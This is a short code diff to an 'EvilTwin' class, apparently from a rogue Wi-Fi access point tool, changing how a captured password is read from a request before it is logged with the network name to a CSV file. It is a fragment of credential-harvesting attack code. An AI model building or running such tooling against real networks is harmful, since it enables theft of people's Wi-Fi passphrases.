@@ -12,8 +12,7 @@ class EvilTwin:
       return f.read()
 
   def log_credentials(self, request):
-    password = request.split('a=')[1]
-    entry = '%s,%s\n' % (self.essid, password)
+    entry = '%s,%s\n' % (self.essid, request['pass'])
     with open('data/evil_twin/log.csv', 'a') as f:
       f.write(entry)
 
